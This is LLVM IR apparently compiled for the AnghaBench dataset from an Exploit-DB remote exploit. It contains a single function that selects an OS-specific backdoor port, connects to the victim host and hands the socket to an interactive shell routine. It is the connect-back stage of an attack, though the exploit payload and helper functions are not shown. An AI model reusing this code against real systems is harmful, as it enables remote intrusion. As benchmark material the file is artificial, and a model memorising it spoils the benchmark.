; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_805.c_we_r_coming.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_805.c_we_r_coming.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@BACKDOOR = common dso_local global i16 0, align 2
@id = common dso_local global i32 0, align 4
@WINBACKDOOR = common dso_local global i16 0, align 2
@BSDBACKDOOR = common dso_local global i16 0, align 2
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@SOL_SOCKET = common dso_local global i32 0, align 4
@SO_REUSEADDR = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@REMCRASHED = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @we_r_coming(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %2, align 8
  %7 = load i16, i16* @BACKDOOR, align 2
  store i16 %7, i16* %5, align 2
  %8 = load i32, i32* @id, align 4
  %9 = icmp eq i32 %8, 6
  br i1 %9, label %10, label %12

10:                                               ; preds = %1
  %11 = load i16, i16* @WINBACKDOOR, align 2
  store i16 %11, i16* %5, align 2
  br label %12

12:                                               ; preds = %10, %1
  %13 = load i32, i32* @id, align 4
  %14 = icmp eq i32 %13, 2
  br i1 %14, label %21, label %15

15:                                               ; preds = %12
  %16 = load i32, i32* @id, align 4
  %17 = icmp eq i32 %16, 10
  br i1 %17, label %21, label %18

18:                                               ; preds = %15
  %19 = load i32, i32* @id, align 4
  %20 = icmp eq i32 %19, 11
  br i1 %20, label %21, label %23

21:                                               ; preds = %18, %15, %12
  %22 = load i16, i16* @BSDBACKDOOR, align 2
  store i16 %22, i16* %5, align 2
  br label %23

23:                                               ; preds = %21, %18
  %24 = load i32, i32* @AF_INET, align 4
  %25 = load i32, i32* @SOCK_STREAM, align 4
  %26 = load i32, i32* @IPPROTO_TCP, align 4
  %27 = call i32 @socket(i32 %24, i32 %25, i32 %26)
  store i32 %27, i32* %3, align 4
  %28 = load i32, i32* %3, align 4
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %33

30:                                               ; preds = %23
  %31 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  %32 = call i32 @exit(i32 1) #3
  unreachable

33:                                               ; preds = %23
  %34 = load i32, i32* %3, align 4
  %35 = load i32, i32* @SOL_SOCKET, align 4
  %36 = load i32, i32* @SO_REUSEADDR, align 4
  %37 = bitcast i32* %4 to i8*
  %38 = call i64 @setsockopt(i32 %34, i32 %35, i32 %36, i8* %37, i32 4)
  %39 = icmp ne i64 %38, 0
  br i1 %39, label %40, label %45

40:                                               ; preds = %33
  %41 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0))
  %42 = load i32, i32* %3, align 4
  %43 = call i32 @close(i32 %42)
  %44 = call i32 @exit(i32 1) #3
  unreachable

45:                                               ; preds = %33
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 3
  %47 = call i32 @memset(i32* %46, i8 signext 0, i32 8)
  %48 = load i32, i32* @AF_INET, align 4
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  store i32 %48, i32* %49, align 4
  %50 = load i16, i16* %5, align 2
  %51 = call i32 @htons(i16 signext %50)
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i32 %51, i32* %52, align 4
  %53 = load i8*, i8** %2, align 8
  %54 = call i32 @get_host_ip(i8* %53)
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  %56 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %55, i32 0, i32 0
  store i32 %54, i32* %56, align 4
  %57 = call i32 @sleep(i32 4)
  %58 = load i32, i32* %3, align 4
  %59 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %60 = call i64 @connect(i32 %58, %struct.sockaddr* %59, i32 16)
  %61 = icmp ne i64 %60, 0
  br i1 %61, label %62, label %68

62:                                               ; preds = %45
  %63 = load i32, i32* @REMCRASHED, align 4
  %64 = call i32 @NPRINTINFO(i32 %63)
  %65 = load i32, i32* %3, align 4
  %66 = call i32 @close(i32 %65)
  %67 = call i32 @exit(i32 1) #3
  unreachable

68:                                               ; preds = %45
  %69 = load i32, i32* %3, align 4
  %70 = call i32 @shell(i32 %69)
  %71 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @setsockopt(i32, i32, i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @memset(i32*, i8 signext, i32) #1

declare dso_local i32 @htons(i16 signext) #1

declare dso_local i32 @get_host_ip(i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @NPRINTINFO(i32) #1

declare dso_local i32 @shell(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
